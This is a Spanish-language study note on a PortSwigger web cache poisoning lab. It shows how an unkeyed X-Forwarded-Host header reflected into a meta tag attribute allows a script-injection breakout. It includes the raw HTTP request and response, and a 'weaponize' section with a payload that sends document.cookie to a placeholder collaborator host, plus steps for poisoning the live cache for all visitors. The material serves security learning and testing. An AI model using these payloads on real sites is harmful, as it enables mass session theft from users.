---
aliases:
  - WCP 001 - X-Forwarded-Host breakout en meta tag
  - cache poisoning attribute breakout
tags:
  - vuln/web-cache-poisoning
  - example
  - portswigger
---

# 001 — `X-Forwarded-Host` reflejado en un atributo → breakout a `<script>`

> Técnica → [[vulnerabilities/030-web-cache-poisoning/web-cache-poisoning|entry point]] · relacionado: lab [Unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)

## Qué muestra
El input **unkeyed** (`X-Forwarded-Host`) se **refleja sin sanitizar dentro de un atributo HTML** (el `content` de un `<meta og:image>`). Como cae dentro de comillas, **rompés el atributo** con `">` y **inyectás tu propio `<script>`** inline. No necesitás hostear JS externo: el payload viaja en el mismo HTML.

## Request → Response

```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```

```http
HTTP/1.1 200 OK
Cache-Control: public
...
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```

## Por qué funciona
- **`X-Forwarded-Host` no forma parte de la cache key** pero **sí cambia la respuesta** → la copia envenenada se cachea y se sirve a todos.
- El valor cae en `content="https://<AQUÍ>/cms/social.png"`. Con `a."><script>...</script>"`:
  - `a.` → basura inicial,
  - `">` → **cierra el atributo `content` y el tag `<meta>`**,
  - `<script>alert(1)</script>` → tu tag inyectado **en el DOM**,
  - `"` final → reabre comillas para "comerse" el `/cms/social.png"` que sigue y no romper el parseo.
- `Cache-Control: public` confirma que **es cacheable**.

## Cómo explotarlo (weaponize)
1. Probá con **cache buster** para no ensuciar a nadie: `GET /en?region=uk&cb=1` + el header.
2. Cambiá `alert(1)` por exfil real:
   ```
   X-Forwarded-Host: a."><script>new Image().src='//TU-collab/?c='+document.cookie</script>"
   ```
3. Cuando confirmes el reflejo, **quitá el cache buster** y mandá la request contra la URL real → queda cacheada → toda víctima que pida `/en?region=uk` ejecuta tu JS.

## Verificación
- Reenviá la request "limpia" (sin el header) y mirá que la respuesta **ya trae el `<script>`** con `X-Cache: hit` → envenenaste la key.

## Detalles que se pasan por alto
- **Breakout de atributo:** la clave es el `">` para salir del `content`; el `"` final evita romper el resto del tag.
- **Acá el payload es inline** (no hace falta exploit server), a diferencia del [[vulnerabilities/030-web-cache-poisoning/examples/002-xfh-script-import|002]] donde se importa un JS externo.
- Si el reflejo estuviera **HTML-encodeado**, este breakout no anda → buscá otro gadget (import, JSON, redirect).

→ Siguiente: [[vulnerabilities/030-web-cache-poisoning/examples/002-xfh-script-import|002 · XFH que controla un `<script src>`]]
